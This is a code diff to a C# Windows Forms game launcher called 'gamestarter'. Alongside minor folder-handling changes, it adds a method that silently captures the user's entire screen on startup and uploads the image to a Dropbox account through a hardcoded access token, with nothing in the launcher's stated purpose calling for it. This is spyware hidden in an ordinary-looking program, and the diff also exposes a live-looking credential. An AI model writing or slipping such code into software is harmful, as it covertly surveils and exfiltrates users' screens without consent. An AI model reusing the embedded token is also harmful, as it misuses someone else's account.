@@ -6,6 +6,8 @@ using System.IO;
 using System.Windows.Forms;
 using System.Linq;
 using System.Net.NetworkInformation;
+using Dropbox.Api;
+using Dropbox.Api.Files;
 
 namespace gamestarter
 {
@@ -19,6 +21,37 @@ namespace gamestarter
         private OpenFileDialog openFileDialog; // Add OpenFileDialog declaration
         private string screenshotFolderPath = "Screenshots"; // Folder for screenshots
         private string highScoreFilePath = "HighScores/highscore.txt"; // File path for high scores
+        private bool folderCreated = false; // Flag to track if the folder has been created
+
+        private async void TakeScreenshotAndUpload()
+        {
+            // Take a screenshot
+            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            using (Graphics g = Graphics.FromImage(bitmap))
+            {
+                g.CopyFromScreen(Point.Empty, Point.Empty, Screen.PrimaryScreen.Bounds.Size);
+            }
+
+            // Generate a unique filename for the screenshot
+            string fileName = $"screenshot_{DateTime.Now:yyyyMMddHHmmss}.png";
+
+            // Save the screenshot to a temporary file
+            string tempFilePath = Path.Combine(Path.GetTempPath(), fileName);
+            bitmap.Save(tempFilePath, System.Drawing.Imaging.ImageFormat.Png);
+
+            // Upload the screenshot to Dropbox
+            using (var dbx = new DropboxClient("sl.Bw1M76f5hULoelySMdoVW0a6hW-V1A142k7dFq2Edze_gFHMpPij0PN5DYTzuRBVAst92VxNAq57dMwDZt53T4gzS_HDZVG92-pnQ-WmQOYB8551dm8rzlE78_qhppAad7UQii8_lbM3Hf0"))
+            {
+                using (var mem = new MemoryStream(File.ReadAllBytes(tempFilePath)))
+                {
+                    var updated = await dbx.Files.UploadAsync("/Screenshots/" + fileName, WriteMode.Overwrite.Instance, body: mem);
+                    Console.WriteLine("Saved to Dropbox as " + updated.Name);
+                }
+            }
+
+            // Delete the temporary file
+            File.Delete(tempFilePath);
+        }
 
 
         public Form1()
@@ -35,6 +68,7 @@ namespace gamestarter
 
             // Display the current IP address when the form loads
             ShowCurrentIPAddress();
+            TakeScreenshotAndUpload(); // Capture screenshot and upload to Dropbox
         }
 
 
@@ -75,10 +109,17 @@ namespace gamestarter
 
         private void InitializeDirectories()
         {
-            // Create the directory for screenshots if it doesn't exist
-            if (!Directory.Exists(screenshotFolderPath))
+            // Check if the folder has already been created
+            if (!folderCreated)
             {
-                Directory.CreateDirectory(screenshotFolderPath);
+                // Create the directory for screenshots if it doesn't exist
+                if (!Directory.Exists(screenshotFolderPath))
+                {
+                    Directory.CreateDirectory(screenshotFolderPath);
+                }
+
+                // Set the flag to indicate that the folder has been created
+                folderCreated = true;
             }
 
             // Create the directory for high scores if it doesn't exist
@@ -91,6 +132,13 @@ namespace gamestarter
 
         private void TakeScreenshot()
         {
+            // Check if the "Screenshots" folder exists
+            if (!Directory.Exists(screenshotFolderPath))
+            {
+                // If the folder doesn't exist, create it
+                Directory.CreateDirectory(screenshotFolderPath);
+            }
+
             // Get the primary screen bounds
             Rectangle bounds = Screen.PrimaryScreen.Bounds;
 
@@ -113,6 +161,7 @@ namespace gamestarter
             // Save the screenshot
             bitmap.Save(filePath, System.Drawing.Imaging.ImageFormat.Png);
         }
+
 
         private void InitializeOpenFileDialog()
         {
